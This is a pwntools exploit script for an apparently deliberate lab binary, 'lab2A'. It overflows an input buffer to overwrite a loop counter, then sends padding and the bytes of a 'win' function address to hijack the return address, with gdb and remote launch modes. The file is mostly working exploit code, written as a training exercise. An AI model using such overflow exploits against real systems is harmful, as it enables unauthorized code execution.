#!/bin/python3
from pwn import *
import sys
import string

binary = "./lab2A"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''
b 0x080487b4
continue
'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    '''
    lowercase_alphabet = string.ascii_lowercase
    arr = list(lowercase_alphabet)
    
    io = start()
    # overwrite i
    io.recvuntil("Input 10 words")
    io.sendline((cyclic(12) + b'1000'))
    j = 0
    for i in range(26):
        if j == len(lowercase_alphabet):
            j = 0
        io.sendline(arr[j])
        j = j + 1
    
    io.interactive()
    '''

    # offset to eip = 22
    offset = 22
    io = start()
    # overwrite i
    io.recvuntil("Input 10 words")
    io.sendline((cyclic(12) + b'1000'))
    for i in range(22):
        io.sendline(cyclic(12))
    # win function

    win = p32(0x080486fd)
    x = [b"\xfd", b"\x86", b"\x04", b"\x08"]
    for i in range(0, len(x)):
        io.sendline(x[i])
    io.interactive()


        


if __name__ == "__main__":
    main()